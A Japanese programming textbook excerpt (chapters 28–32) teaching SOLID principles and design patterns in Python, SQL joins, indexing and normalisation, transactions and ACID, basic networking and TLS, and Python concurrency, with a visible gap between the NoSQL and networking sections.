第28章 デザインパターン（Design Patterns）とクリーンアーキテクチャ

重要な概念

動作するコードを書くことはできます。しかし、要件が変わっても動き続けるコードが書けるでしょうか？デザインパターン（design pattern）とSOLID原則は、数十年にわたるソフトウェアエンジニアリングの集合知であり、繰り返し現れる問題に対する実証済みの解決策です。これらはコードベースが優雅に成長するか、それとも自重で崩壊するかの分かれ目となります。この章では最も重要なパターンを認識し、いつ適用するか、そして同様に重要な点として適用しないべきときを理解できるようになります。

SOLID原則

SOLIDは、オブジェクト指向設計を導く5つの原則の頭文字をとったものです。Robert C. Martinによってまとめられ命名され、保守しやすいソフトウェアの基盤を成します。Pythonコードでの実際の違反例と修正例を見ながら、一つひとつ解説していきます。

S — 単一責任の原則（Single Responsibility Principle / SRP）

クラスは変更する理由が一つだけであるべきです。ビジネスロジックとファイルI/Oの両方を扱うクラスには、更新が必要になる理由が二つあることになります。

違反例：

class TaskManager:
    """Handles tasks AND writes reports AND sends emails."""
    def __init__(self):
        self.tasks = []

    def add_task(self, title, priority):
        self.tasks.append({"title": title, "priority": priority})

    def generate_report(self):
        html = "<h1>Task Report</h1>"
        for t in self.tasks:
            html += f"<p>{t['title']} - {t['priority']}</p>"
        return html

    def send_email(self, to_address, body):
        import smtplib
        server = smtplib.SMTP("mail.example.com")
        server.sendmail("tasks@example.com", to_address, body)
        server.quit()

このクラスには変更する理由が三つあります：タスクロジック、レポートのフォーマット、メール配信です。SMTPからメールAPIに切り替える場合、タスク管理を担うのと同じファイルを編集することになります。

修正 — 責任ごとにクラスを分割する：

class TaskManager:
    """Only manages tasks."""
    def __init__(self):
        self.tasks = []

    def add_task(self, title, priority):
        self.tasks.append({"title": title, "priority": priority})

    def get_tasks(self):
        return list(self.tasks)


class TaskReporter:
    """Only generates reports from task data."""
    def generate_html(self, tasks):
        html = "<h1>Task Report</h1>"
        for t in tasks:
            html += f"<p>{t['title']} - {t['priority']}</p>"
        return html


class EmailSender:
    """Only sends emails."""
    def send(self, to_address, body):
        import smtplib
        server = smtplib.SMTP("mail.example.com")
        server.sendmail("tasks@example.com", to_address, body)
        server.quit()

これで各クラスが変更する理由をちょうど一つ持つようになりました。タスクロジックに触れずにメール送信機能を入れ替えることができます。

O — 開放/閉鎖の原則（Open/Closed Principle / OCP）

ソフトウェアの構成要素は拡張に対して開放的で、修正に対して閉鎖的であるべきです。既存のコードを書き直すことなく、新しい振る舞いを追加できる必要があります。

違反例：

class TaskExporter:
    def export(self, tasks, format_type):
        if format_type == "json":
            import json
            return json.dumps(tasks)
        elif format_type == "csv":
            lines = ["title,priority"]
            for t in tasks:
                lines.append(f"{t['title']},{t['priority']}")
            return "\n".join(lines)
        # Every new format requires editing THIS method

XMLエクスポートを追加するには既存のexportメソッドを修正する必要があり、OCPに違反します。

修正 — ポリモーフィズム（多態性）を使う：

from abc import ABC, abstractmethod

class Exporter(ABC):
    @abstractmethod
    def export(self, tasks): pass

class JsonExporter(Exporter):
    def export(self, tasks):
        import json
        return json.dumps(tasks)

class CsvExporter(Exporter):
    def export(self, tasks):
        lines = ["title,priority"]
        for t in tasks:
            lines.append(f"{t['title']},{t['priority']}")
        return "\n".join(lines)

# Adding XML? Create a new class. Zero existing code changes.
class XmlExporter(Exporter):
    def export(self, tasks):
        xml = "<tasks>"
        for t in tasks:
            xml += f"<task><title>{t['title']}</title></task>"
        xml += "</tasks>"
        return xml

L — リスコフの置換原則（Liskov Substitution Principle / LSP）

サブタイプは、正確さを損なうことなく、その親型が期待される任意の場所で使用できなければなりません。関数がBirdを受け付ける場合、Penguin.fly()が例外を投げてクラッシュすることなくPenguinを渡せる必要があります。

違反例：

class Rectangle:
    def __init__(self, width, height):
        self.width = width
        self.height = height

    def area(self):
        return self.width * self.height

class Square(Rectangle):
    def __init__(self, side):
        super().__init__(side, side)

    def set_width(self, w):
        self.width = w
        self.height = w  # Silently changes height too!

rect.set_width(5)を呼び出してからrect.heightが変わっていないことを確認するコードは、Squareでは壊れます。修正方法：SquareをRectangleから継承させない。代わりに共通のShapeインターフェースを使います。

I — インターフェース分離の原則（Interface Segregation Principle / ISP）

クライアントは使用しないメソッドへの依存を強制されるべきではありません。20のメソッドを持つ「太い」インターフェースは、実装者全員に未使用メソッドのスタブを書かせることになります。

違反例：

class Worker(ABC):
    @abstractmethod
    def code(self): pass

    @abstractmethod
    def test(self): pass

    @abstractmethod
    def manage_team(self): pass  # Not all workers manage!

class JuniorDev(Worker):
    def code(self): return "Writing code"
    def test(self): return "Running tests"
    def manage_team(self):
        raise NotImplementedError("Juniors don't manage!")

修正 — 役割ごとにインターフェースを分割する：

class Coder(ABC):
    @abstractmethod
    def code(self): pass

class Tester(ABC):
    @abstractmethod
    def test(self): pass

class Manager(ABC):
    @abstractmethod
    def manage_team(self): pass

class JuniorDev(Coder, Tester):
    def code(self): return "Writing code"
    def test(self): return "Running tests"

class TechLead(Coder, Tester, Manager):
    def code(self): return "Writing code"
    def test(self): return "Running tests"
    def manage_team(self): return "Leading the team"

D — 依存性逆転の原則（Dependency Inversion Principle / DIP）

上位モジュールは下位モジュールに依存してはいけません。両方とも抽象（abstractions）に依存するべきです。

違反例：

class TaskService:
    def __init__(self):
        self.db = SQLiteDatabase("tasks.db")  # Hard-wired!

    def get_all_tasks(self):
        return self.db.query("SELECT * FROM tasks")

実際のファイルなしではデータベースの差し替えもテストもできません。修正 — 抽象に依存する：

class Database(ABC):
    @abstractmethod
    def query(self, sql): pass

class TaskService:
    def __init__(self, db: Database):
        self.db = db  # Injected from outside

    def get_all_tasks(self):
        return self.db.query("SELECT * FROM tasks")

# Production:
service = TaskService(SQLiteDatabase("tasks.db"))
# Testing:
test_service = TaskService(InMemoryDatabase())

生成パターン（Creational Patterns）

生成パターンはオブジェクトの生成方法を抽象化し、呼び出し側のコードがインスタンス化されるクラスを知る必要をなくします。

ファクトリーパターン（Factory Pattern）

ファクトリーは生成ロジックを公開せずにオブジェクトを作成します。コンストラクタを直接呼び出す代わりに、入力に基づいて適切なオブジェクトを返すファクトリー関数を呼び出します。

class Task:
    def __init__(self, title, priority="medium"):
        self.title = title
        self.priority = priority

class Bug(Task):
    def __init__(self, title, severity="normal"):
        super().__init__(title, priority="high")
        self.severity = severity

class Feature(Task):
    def __init__(self, title, story_points=1):
        super().__init__(title, priority="medium")
        self.story_points = story_points

def create_task(task_type, title, **kwargs):
    """Factory function: caller doesn't know which class is used."""
    factories = {
        "bug": Bug,
        "feature": Feature,
        "task": Task,
    }
    cls = factories.get(task_type)
    if cls is None:
        raise ValueError(f"Unknown task type: {task_type}")
    return cls(title, **kwargs)

# Usage — caller never imports Bug or Feature directly
item = create_task("bug", "Login page crashes", severity="critical")
print(type(item).__name__)  # Bug

ビルダーパターン（Builder Pattern）

構築に多くのオプションパラメータが必要な場合、ビルダーパターンは15個の引数を持つコンストラクタの代わりに、読みやすいステップバイステップのインターフェースを提供します。

class TaskBuilder:
    def __init__(self, title):
        self._title = title
        self._priority = "medium"
        self._assignee = None
        self._labels = []
        self._due_date = None

    def priority(self, p):
        self._priority = p
        return self  # Enable chaining

    def assign_to(self, name):
        self._assignee = name
        return self

    def label(self, lbl):
        self._labels.append(lbl)
        return self

    def due(self, date):
        self._due_date = date
        return self

    def build(self):
        return {
            "title": self._title,
            "priority": self._priority,
            "assignee": self._assignee,
            "labels": self._labels,
            "due_date": self._due_date,
        }

# Clean, readable construction
task = (TaskBuilder("Fix login bug")
        .priority("high")
        .assign_to("Alice")
        .label("security")
        .label("urgent")
        .due("2026-04-01")
        .build())

シングルトン（Singleton）— そして、なぜ通常は間違いか

シングルトンはクラスのインスタンスがグローバルに一つだけ存在することを保証します。

class ConfigManager:
    _instance = None

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance.settings = {}
        return cls._instance

a = ConfigManager()
b = ConfigManager()
assert a is b  # True — same object
注意

「シングルトンは状態共有の良い方法」というのは誤解です。シングルトンは変装したグローバル状態です。すべてのテストが同じミュータブルなインスタンスを共有するため、テストが非常に難しくなります。また、関数シグネチャに現れないままどのコードからでもアクセスできる隠れた依存関係を作り出します。依存性注入（dependency injection）を使うことをお勧めします。最上位で一つのインスタンスを作成し、必要なすべてに渡してください。

構造パターン（Structural Patterns）

アダプターパターン（Adapter Pattern）

アダプターは互換性のないインターフェースをコードが期待するものに合わせるためにラップします。TaskForgeがsave()とload()を期待しているが、サードパーティのライブラリがwrite_data()とread_data()を使っている場合を想像してください。

class ThirdPartyStorage:
    """We cannot modify this class."""
    def write_data(self, key, value):
        print(f"Writing {key}: {value}")

    def read_data(self, key):
        return {"title": "Example task"}

class StorageAdapter:
    """Makes ThirdPartyStorage look like our interface."""
    def __init__(self, adaptee):
        self._adaptee = adaptee

    def save(self, key, value):
        return self._adaptee.write_data(key, value)

    def load(self, key):
        return self._adaptee.read_data(key)

# TaskForge code works without changes
storage = StorageAdapter(ThirdPartyStorage())
storage.save("task-1", {"title": "Buy groceries"})

デコレーターパターン（Decorator Pattern）

デコレーターパターンはクラスを修正せずにオブジェクトに振る舞いを追加します。Pythonは関数デコレーターをネイティブにサポートしていますが、OOP版は同じインターフェースを持つ別のオブジェクトの内部に一つのオブジェクトをラップします。

class TaskService:
    def get_task(self, task_id):
        return {"id": task_id, "title": "Fix bug"}

class LoggingTaskService:
    """Adds logging around every call."""
    def __init__(self, wrapped):
        self._wrapped = wrapped

    def get_task(self, task_id):
        print(f"[LOG] Getting task {task_id}")
        result = self._wrapped.get_task(task_id)
        print(f"[LOG] Found: {result['title']}")
        return result

class CachingTaskService:
    """Adds caching."""
    def __init__(self, wrapped):
        self._wrapped = wrapped
        self._cache = {}

    def get_task(self, task_id):
        if task_id not in self._cache:
            self._cache[task_id] = self._wrapped.get_task(task_id)
        return self._cache[task_id]

# Stack decorators: logging around caching around real service
service = LoggingTaskService(CachingTaskService(TaskService()))

ファサードパターン（Facade Pattern）

ファサードは複雑なサブシステムへの簡略化されたインターフェースを提供します。呼び出し側が10個のクラスと対話させる代わりに、いくつかの明確なメソッドを持つ一つのクラスを提供します。

class TaskForge:
    """Facade: one entry point for the entire system."""
    def __init__(self, db, auth, notifier, logger):
        self._db = db
        self._auth = auth
        self._notifier = notifier
        self._logger = logger

    def create_task(self, user_token, title, priority):
        user = self._auth.verify(user_token)
        task = self._db.insert_task(title, priority, user.id)
        self._notifier.notify_team(f"New task: {title}")
        self._logger.log("task_created", task.id, user.id)
        return task

振る舞いパターン（Behavioural Patterns）

オブザーバーパターン（Observer Pattern / Pub/Sub）

オブザーバーパターンはオブジェクトがイベントを購読できるようにします。何かが起きると、すべての購読者が自動的に通知され、イベントソースとハンドラーが疎結合になります。

class EventBus:
    def __init__(self):
        self._listeners = {}

    def subscribe(self, event_type, callback):
        self._listeners.setdefault(event_type, []).append(callback)

    def publish(self, event_type, data):
        for callback in self._listeners.get(event_type, []):
            callback(data)

bus = EventBus()

def send_email(task):
    print(f"Email: New task '{task['title']}' created")

def update_dashboard(task):
    print(f"Dashboard: Refreshing with new task")

bus.subscribe("task_created", send_email)
bus.subscribe("task_created", update_dashboard)

# When a task is created, both handlers fire automatically
bus.publish("task_created", {"title": "Fix login bug", "priority": "high"})

ストラテジーパターン（Strategy Pattern）

ストラテジーパターンは交換可能なアルゴリズムのファミリーを定義します。クライアントは実行時に使用するアルゴリズムを選びます。これがTaskForgeのストレージバックエンドに使用するパターンです。

from abc import ABC, abstractmethod

class StorageBackend(ABC):
    @abstractmethod
    def save(self, task_id, task_data):
        """Persist a task."""
        pass

    @abstractmethod
    def load(self, task_id):
        """Retrieve a task by ID, or None."""
        pass

    @abstractmethod
    def list_all(self):
        """Return all stored tasks."""
        pass

class InMemoryBackend(StorageBackend):
    def __init__(self):
        self._store = {}

    def save(self, task_id, task_data):
        self._store[task_id] = task_data

    def load(self, task_id):
        return self._store.get(task_id)

    def list_all(self):
        return list(self._store.values())

class TaskManager:
    def __init__(self, backend: StorageBackend):
        self._backend = backend

    def add_task(self, task_id, title, priority="medium"):
        self._backend.save(task_id, {"title": title, "priority": priority})

    def get_task(self, task_id):
        return self._backend.load(task_id)

素晴らしい点は、TaskManagerがどのバックエンドを使っているかを知らなくてよいことです。ビジネスロジックを一切変更せずに、インメモリからSQLite、クラウドデータベースへと切り替えることができます。

コマンドパターン（Command Pattern）

コマンドパターンはリクエストをオブジェクトとしてカプセル化し、操作のアンドゥ/リドゥ、キューイング、ログ記録を可能にします。

class Command(ABC):
    @abstractmethod
    def execute(self): pass

    @abstractmethod
    def undo(self): pass

class AddTaskCommand(Command):
    def __init__(self, manager, task_id, title):
        self.manager = manager
        self.task_id = task_id
        self.title = title

    def execute(self):
        self.manager.add_task(self.task_id, self.title)

    def undo(self):
        self.manager.remove_task(self.task_id)

class CommandHistory:
    def __init__(self):
        self._history = []

    def execute(self, command):
        command.execute()
        self._history.append(command)

    def undo_last(self):
        if self._history:
            cmd = self._history.pop()
            cmd.undo()

依存性注入（Dependency Injection）の実践

依存性注入（DI）とは、クラス内部で依存関係を生成するのではなく、外部から渡すプラクティスです。これは上記のDIPで既に見ました。Pythonでは通常DIフレームワークは不要であり、コンストラクタインジェクションで十分です。

# WITHOUT DI: tightly coupled, untestable
class OrderProcessor:
    def __init__(self):
        self.payment = StripePayment()  # Hard-coded!
        self.email = SendGridEmail()    # Hard-coded!

# WITH DI: loosely coupled, easily testable
class OrderProcessor:
    def __init__(self, payment, email):
        self.payment = payment  # Injected
        self.email = email      # Injected

# Production
processor = OrderProcessor(StripePayment(), SendGridEmail())
# Testing
test_proc = OrderProcessor(MockPayment(), MockEmail())

リファクタリングパターンとコードスメル（Code Smells）

コードスメル（code smell）は、より深い問題がある可能性を示す表面的な指標です。最も一般的なスメルとその対処法を以下に示します：

一般的なコードスメルとリファクタリングの対処法
コードスメル症状リファクタリング
神クラス（God Class）一つのクラスが何でも行う（500行以上、20以上のメソッド）クラスの抽出 — 責任ごとにコンポーネントに分割する
機能の羨望（Feature Envy）メソッドが自クラスより他クラスのデータを多く使うメソッドの移動 — 本来属するクラスに移す
散弾銃の手術（Shotgun Surgery）一つの変更が多くのファイルの修正を必要とするメソッドの移動/クラスの抽出 — 関連ロジックをまとめる
長いメソッド（Long Method）メソッドが20〜30行を超えるか、複数のことをするメソッドの抽出 — より小さな名前付きステップに分解する
基本型への執着（Primitive Obsession）小さな値オブジェクトの代わりに生の文字列/整数を使う値オブジェクトへの置き換え（例：生の文字列の代わりにEmailクラス）

メソッドの抽出（Extract Method）は最も一般的なリファクタリングです。一つの一貫したことをするコードブロックを取り出し、説明的な名前を付け、関数にします：

# Before: one large function doing four things
def process_order(order):
    if not order.get("items"):
        raise ValueError("No items")
    if order["total"] < 0:
        raise ValueError("Negative total")
    tax = order["total"] * 0.08
    order["tax"] = tax
    order["grand_total"] = order["total"] + tax
    db.save(order)
    email.send(order["customer"], f"Confirmed: ${order['grand_total']}")

# After: each step has a clear name
def process_order(order):
    validate_order(order)
    apply_tax(order)
    db.save(order)
    notify_customer(order)

def validate_order(order):
    if not order.get("items"):
        raise ValueError("No items")
    if order["total"] < 0:
        raise ValueError("Negative total")

def apply_tax(order, rate=0.08):
    order["tax"] = order["total"] * rate
    order["grand_total"] = order["total"] + order["tax"]

def notify_customer(order):
    email.send(order["customer"], f"Confirmed: ${order['grand_total']}")

第29章 SQLとクエリマスタリー

重要な概念

第15章では、テーブルの作成と基本的なクエリを実行するのに十分なSQLを学びました。実際の現場では、数百万行のデータ、複雑な関係、パフォーマンス要件を持つデータベースに遭遇します。この章では「SELECTが書ける」から「効率的で複雑なクエリが書け、なぜそのようなパフォーマンスになるかを理解できる」レベルへと引き上げます。

JOIN — テーブルの結合

実際のデータベースは重複を避けるためにデータを複数のテーブルに分散させています（正規化）。JOINはクエリでそのデータを再結合する方法です。様々なJOINの種類を理解することは不可欠です。

INNER JOIN

両方のテーブルで一致する行のみを返します。タスクにカテゴリがない場合、完全に除外されます。

-- Tasks with their category names (only matched rows)
SELECT tasks.title, categories.name AS category
FROM tasks
INNER JOIN categories ON tasks.category_id = categories.id;

INNER JOINは二つの集合の積集合と考えてください。一致するペアのみが結果に現れます。

LEFT OUTER JOIN

右テーブルに一致がなくても、左テーブルのすべての行を返します。右テーブルの一致しないカラムはNULLになります。

-- ALL tasks, including those without a category
SELECT tasks.title, categories.name AS category
FROM tasks
LEFT JOIN categories ON tasks.category_id = categories.id;

-- Result includes:
-- "Fix login bug"    | "Bugs"
-- "Unassigned task"  | NULL    ← no category, still included

CROSS JOIN

デカルト積（Cartesian product）を返します。最初のテーブルのすべての行を二番目のテーブルのすべての行と組み合わせます。テーブルAが3行でテーブルBが4行の場合、結果は12行になります。滅多に必要になりませんが、すべての可能な組み合わせを生成するのに便利です。

-- Every task paired with every user (for scheduling matrix)
SELECT tasks.title, users.name
FROM tasks
CROSS JOIN users;

自己結合（Self-Join）

テーブルを自身と結合します。サブタスクを持つタスクのような階層データに便利です。

-- Find tasks and their parent tasks
SELECT child.title AS subtask, parent.title AS parent_task
FROM tasks AS child
INNER JOIN tasks AS parent ON child.parent_id = parent.id;

サブクエリとCTE

サブクエリ（Subqueries）

サブクエリは別のクエリ内にネストされたクエリです。非相関サブクエリ（uncorrelated subquery）は一度だけ独立して実行されます。相関サブクエリ（correlated subquery）は外部クエリの各行に対して一度実行されるため低速ですが、必要になることがあります。

-- Uncorrelated: find tasks with above-average priority score
SELECT title, priority_score
FROM tasks
WHERE priority_score > (SELECT AVG(priority_score) FROM tasks);

-- Correlated: find each user's most recent task
SELECT t.title, t.created_at, t.user_id
FROM tasks t
WHERE t.created_at = (
    SELECT MAX(t2.created_at)
    FROM tasks t2
    WHERE t2.user_id = t.user_id  -- References outer query
);

共通テーブル式（Common Table Expressions / CTEs）

CTEはWITH句を使用して一時的な名前付き結果セットを定義します。CTEは複雑なクエリを論理的なステップに分解することで読みやすくします。

-- Find categories with more than 5 high-priority tasks
WITH high_priority AS (
    SELECT category_id, COUNT(*) AS cnt
    FROM tasks
    WHERE priority = 'high'
    GROUP BY category_id
)
SELECT categories.name, high_priority.cnt
FROM high_priority
INNER JOIN categories ON high_priority.category_id = categories.id
WHERE high_priority.cnt > 5;

CTEはネストされたサブクエリよりはるかに読みやすく、メインクエリで同じCTEを複数回参照することができます。

ウィンドウ関数（Window Functions）

ウィンドウ関数は、GROUP BYのように結果を集約することなく、現在の行に関連する行のセットに対して計算を行います。モダンSQLの最も強力な機能の一つです。

-- ROW_NUMBER: sequential number within each category
SELECT title, category_id, priority_score,
       ROW_NUMBER() OVER (
           PARTITION BY category_id
           ORDER BY priority_score DESC
       ) AS rank_in_category
FROM tasks;

-- RANK: ties get the same rank (with gaps after)
SELECT title, priority_score,
       RANK() OVER (ORDER BY priority_score DESC) AS rank
FROM tasks;

-- LAG / LEAD: access the previous/next row's value
SELECT title, created_at,
       LAG(created_at) OVER (ORDER BY created_at) AS prev_date
FROM tasks;

OVER句はウィンドウを定義します：PARTITION BYは行をグループに分割し（GROUP BYと似ていますが集約しない）、ORDER BYは各パーティション内の並び順を定義します。

インデックス — クエリを速くする

インデックスなしでは、すべてのクエリがテーブル全体をスキャンします（「フルテーブルスキャン」）。インデックス（index）は、データベースがすべてをスキャンせずに行を見つけられるようにする別のデータ構造です。教科書の巻末索引のようなものだと考えてください。

B木インデックス（B-Tree Indexes）

最も一般的なインデックスの種類はB木（平衡木 / balanced tree）です。各ノードが値の範囲を指す木構造でキーを並べた状態で保持します。値の検索はO(n)ではなくO(log n)になります。

-- Single-column index on the column you filter by most
CREATE INDEX idx_tasks_priority ON tasks(priority);

-- Composite index: useful when filtering by both columns together
CREATE INDEX idx_tasks_cat_priority ON tasks(category_id, priority);

-- Column order matters! This index helps:
--   WHERE category_id = 5 AND priority = 'high'  (both columns)
--   WHERE category_id = 5                         (leftmost column)
-- But NOT:
--   WHERE priority = 'high'  (can't skip the first column)

カバリングインデックス（Covering Indexes）

カバリングインデックスはクエリが必要とするすべてのカラムを含むため、データベースはメインテーブルに触れずにインデックスだけでクエリに答えることができます。

-- If this is your most common query:
SELECT title, priority FROM tasks WHERE category_id = 5;

-- This covering index answers it without touching the table:
CREATE INDEX idx_covering ON tasks(category_id, title, priority);

インデックスが逆効果になる場合

インデックスはタダではありません。すべてのインデックスはINSERT、UPDATE、DELETE操作にオーバーヘッドを加え（インデックスも更新する必要がある）、ストレージを消費します。読み取りが少なく書き込みが多いテーブルでは、インデックスが多すぎると実際には処理が遅くなる場合があります。闇雲にインデックスを付ける前にプロファイリングを行ってください。

クエリの最適化

EXPLAIN — クエリプランを読む

EXPLAINコマンドはデータベースがクエリをどのように実行するかを表示します。

EXPLAIN QUERY PLAN
SELECT tasks.title, categories.name
FROM tasks
INNER JOIN categories ON tasks.category_id = categories.id
WHERE tasks.priority = 'high';

-- Output might show:
-- SCAN TABLE tasks           ← Full table scan! No index on priority
-- SEARCH TABLE categories USING INTEGER PRIMARY KEY  ← Good, using PK

SCAN（大きなテーブルでは悪い — すべての行を読む）とSEARCHまたはUSING INDEX（良い — インデックスを使う）という言葉を探してください。WHERE句のある大きなテーブルでSCANが見えた場合、おそらくインデックスが必要です。

ヒント

本番環境では、遅いクエリがアプリケーションのダウンタイムの最も一般的な原因の一つです。EXPLAINを実行し、出力を解釈し、適切なインデックスを追加する能力は常に使うことになります。このセクションをスキップしないでください — 書くすべてのクエリで練習してください。

N+1問題（The N+1 Problem）

N+1問題は、コードがリストを取得するために一つのクエリを実行し、各アイテムの関連データを取得するためにさらにN個のクエリを実行する場合に発生します。非常によくあり、非常に無駄の多いパターンです。

# THE N+1 PROBLEM
# 1 query to get all categories
categories = db.execute("SELECT * FROM categories").fetchall()

for cat in categories:
    # N queries, one per category!
    tasks = db.execute(
        "SELECT * FROM tasks WHERE category_id = ?", (cat["id"],)
    ).fetchall()
    print(f"{cat['name']}: {len(tasks)} tasks")

# If there are 100 categories, that's 101 total queries!

# THE FIX: single JOIN query
results = db.execute("""
    SELECT categories.name, COUNT(tasks.id) AS task_count
    FROM categories
    LEFT JOIN tasks ON tasks.category_id = categories.id
    GROUP BY categories.id
""").fetchall()
# 1 query instead of 101!

正規化（Normalisation）

正規化は冗長性を減らすようにデータを整理します。いくつかの「正規形」があり、それぞれが前の正規形の上に構築されます。

第一正規形（1NF）：すべてのカラムがアトミック（単一）な値を含みます。リストや繰り返しグループはありません。

-- VIOLATES 1NF: tags column contains a comma-separated list
-- | id | title    | tags              |
-- | 1  | Fix bug  | "urgent,security" |

-- 1NF FIX: separate table for tags
-- tasks: | id | title   |
-- tags:   | id | task_id | tag      |
--         | 1  | 1       | urgent   |
--         | 2  | 1       | security |

第二正規形（2NF）：1NFを満たし、すべての非キーカラムが主キー全体に依存します（複合キーに関連）。

第三正規形（3NF）：2NFを満たし、非キーカラムが他の非キーカラムに依存しません（推移的依存なし）。

-- VIOLATES 3NF: city depends on zip_code, not on the primary key
-- | user_id | name  | zip_code | city     |

-- 3NF FIX: separate zip_codes table
-- users:     | user_id | name  | zip_code |
-- zip_codes: | zip_code | city            |

非正規化が有用なとき：読み取りが多いアナリティクスやレポートのクエリでは、コストのかかるJOINを避けるために冗長なデータを格納することが有益な場合があります。これは意図的なトレードオフです：書き込みがより複雑になり、データの不整合が生じる可能性と引き換えに読み取りが高速になります。

第30章 トランザクション、NoSQL、データの進化

重要な概念

二人のユーザーが同じタスクを同時に更新するとどうなるでしょうか？関連するレコードの保存途中でサーバーがクラッシュしたら？トランザクションはこれらの危険からデータを守ります。そしてリレーショナルデータベースが適切なツールでない場合もあります。NoSQLを理解することで、賢く選択するための語彙が身につきます。

トランザクションとACID

トランザクション（transaction）は、すべて成功するかすべて失敗しなければならないデータベース操作のグループです。中間状態はありません。これを保証するプロパティをACIDと呼びます：

原子性（Atomicity）：トランザクション内のすべての操作が成功するか、一つも成功しないかのどちらかです。5ステップ中のステップ3が失敗した場合、ステップ1と2は発生しなかったかのようにロールバックされます。

一貫性（Consistency）：トランザクションはデータベースを一つの有効な状態から別の状態へ移行させます。制約（外部キー、一意性ルール、チェック制約）は常に適用されます。

独立性（Isolation）：並行するトランザクションはお互いに干渉しません。各トランザクションは自分だけが実行しているかのようにデータベースを見ます（独立性の度合いは設定可能です）。

耐久性（Durability）：コミットされると、データはクラッシュ、停電、再起動を生き延びます。

import sqlite3

conn = sqlite3.connect("bank.db")
cursor = conn.cursor()

try:
    cursor.execute("UPDATE accounts SET balance = balance - 100 WHERE id = 'A'")
    cursor.execute("UPDATE accounts SET balance = balance + 100 WHERE id = 'B'")
    conn.commit()    # Both succeed
except Exception:
    conn.rollback()  # Both fail — Account A keeps its money

分離レベル（Isolation Levels）

分離はバイナリではなく、スペクトラムがあります。より厳密な分離はより高い安全性を意味しますが、並行性は低くなります。

ダーティリード（Dirty read）：トランザクションAが、トランザクションBが変更したがまだコミットしていないデータを読み取ります。Bがロールバックすると、Aは実際には存在しなかったデータを読んだことになります。

非再現読み取り（Non-repeatable read）：トランザクションAが行を読み取り、Bがそれを変更してコミットし、Aが再度読み取ると異なる値を得ます。

ファントムリード（Phantom read）：トランザクションAが条件に一致する行を照会し、Bが新しい一致する行を挿入してコミットし、Aが再度照会すると以前はなかった「ファントム」行が見えます。

デッドロック（Deadlocks）

デッドロックは、二つのトランザクションがそれぞれ相手が必要とするロックを保持している場合に発生します。どちらも進めないため、永遠に待ち続けます。

# Transaction 1:                    Transaction 2:
# Lock row A                        Lock row B
# Try to lock row B (WAIT...)       Try to lock row A (WAIT...)
# ... deadlock!                     ... deadlock!

防止策：

  • 常に同じ順序でロックを取得する（例：常にIDが小さい方を先にロックする）
  • トランザクションを短く保つ — ロックを保持する時間が短いほど衝突の可能性が減る
  • タイムアウトを使用して、ブロックされたトランザクションが永遠に待つのではなく諦めるようにする
  • ほとんどのデータベースはデッドロックを自動的に検出し、一つのトランザクションをロールバックする

コネクションプーリング（Connection Pooling）

すべてのデータベース接続にはオーバーヘッドがあります：TCPのセットアップ、認証、メモリの割り当て。コネクションプール（connection pool）はあらかじめ開かれた接続を維持します。コードが接続を必要とするとき、プールから借り、完了したら返却します。

# Conceptual connection pool (real systems use SQLAlchemy or similar)
class ConnectionPool:
    def __init__(self, db_path, pool_size=5):
        self._available = [sqlite3.connect(db_path) for _ in range(pool_size)]
        self._in_use = []

    def get_connection(self):
        if not self._available:
            raise Exception("No connections available")
        conn = self._available.pop()
        self._in_use.append(conn)
        return conn

    def return_connection(self, conn):
        self._in_use.remove(conn)
        self._available.append(conn)

リレーショナルデータベース（SQL）はほとんどの場合において適切な選択です。しかし、特定のワークロードでは異なるデータモデルが有益です。NoSQLの主要なカテゴリは四つあります：

ドキュメントストア（例：MongoDB）

JSONのようなドキュメントとしてデータを格納します。各ドキュメントは異なる構造を持てます。コンテンツ管理、ユーザープロファイル、カタログに最適です。

TCP対UDP

TCP（伝送制御プロトコル / Transmission Control Protocol）はスリーウェイハンドシェイク（three-way handshake）を使って信頼性のある順序付きの配送を提供します：

  1. SYN：クライアントが「接続したい」と言う
  2. SYN-ACK：サーバーが「OK、了解。私も接続したい。」と言う
  3. ACK：クライアントが「了解。接続完了。」と言う

このハンドシェイクの後、データは確実に流れます。失われたパケットは再送されます。順序が乱れたパケットは並べ直されます。

UDP（ユーザーデータグラムプロトコル / User Datagram Protocol）はハンドシェイクを完全にスキップします。パケットを送信して届くことを期待します。より速いですが信頼性がありません。

TLS/HTTPS

TLS（トランスポートレイヤーセキュリティ / Transport Layer Security）はクライアントとサーバー間の接続を暗号化します。HTTPSはTLS上のHTTPです。簡略化されたハンドシェイク：

  1. クライアントがサポートされる暗号スイートと共に「Hello」を送る
  2. サーバーが証明書（身元を証明）と選択された暗号を送る
  3. クライアントが信頼された認証局（Certificate Authorities）に対して証明書を検証する
  4. 両側が非対称暗号化（asymmetric encryption）（低速、一回限り）を使って鍵を交換する
  5. 残りのセッションでは対称暗号化（symmetric encryption）（高速）に切り替える

第32章 並行性と並列処理

重要な概念

モダンなアプリケーションは多くのことを同時に行います：複数のウェブリクエストの処理、複数のAPIからの同時データ取得、UIをレスポンシブに保ちながらのファイル処理。並行性を理解することで、フリーズせず、データを失わず、モダンなハードウェアを最大限に活用するアプリケーションが構築できます。

三つのモデル：プロセス、スレッド、非同期

Pythonは複数のことを同時に行う三つの基本的な方法を提供します。それぞれが異なる状況に適しています。

プロセス（Processes）は別々のメモリ空間で動く完全に独立したプログラムです。複数のCPUコアで真に並行して実行できます。ただし作成コストが高く、プロセス間通信は複雑です。

スレッド（Threads）は単一プロセス内の軽量な実行単位です。メモリを共有するため通信は簡単ですが危険です（競合状態）。PythonではGILがCPUバウンドな作業でのスレッドの有効性を制限します。

非同期/await（Async/await）（協調マルチタスキング）は単一スレッドを使いますが、タスクがI/Oを待つたびに切り替えます。I/Oバウンドな作業には非常に効率的ですが、CPUバウンドなタスクを高速化することはできません。

PythonのGIL

グローバルインタープリターロック（Global Interpreter Lock / GIL）はCPythonにあるミューテックスで、一度に一つのスレッドのみがPythonバイトコードを実行することを保証します。これはスレッドがCPUバウンドな作業で真の並列処理を達成できないことを意味します。

GILが防ぐもの：異なるコアで二つのスレッドが同時に数値計算を行うこと。

GILが防がないもの：I/Oバウンドな並行性。スレッドがネットワークレスポンスやディスク読み取りを待つとき、GILを解放して他のスレッドが実行できるようにします。これがスレッディングがI/Oタスクに対してまだ有効に機能する理由です。

import threading
import time

# I/O-bound: threading helps (GIL released during sleep/network)
def fetch_data(url):
    time.sleep(1)  # Simulates network I/O
    return f"Data from {url}"

# CPU-bound: threading does NOT help (GIL blocks parallelism)
def compute_heavy(n):
    total = 0
    for i in range(n):
        total += i * i
    return total

スレッディング（Threading）

